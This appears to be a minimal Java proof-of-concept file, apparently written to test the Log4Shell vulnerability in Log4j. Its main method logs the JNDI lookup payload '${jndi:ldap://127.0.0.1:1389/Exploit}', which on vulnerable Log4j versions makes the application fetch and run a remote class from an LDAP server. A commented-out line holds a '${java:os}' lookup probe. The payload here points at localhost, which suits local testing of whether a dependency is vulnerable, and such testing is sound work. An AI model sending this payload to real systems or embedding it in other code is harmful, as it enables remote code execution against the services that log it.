import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;


/**
 * @author zhaohj
 * @date 2021-12-10 11:23 下午
 * @Description
 */
public class Test {

    private static final Logger LOGGER= LogManager.getLogger(Test.class);

    public static void main(String[] args) {
        LOGGER.error("${jndi:ldap://127.0.0.1:1389/Exploit}");
//        LOGGER.error("${java:os}");
    }

}
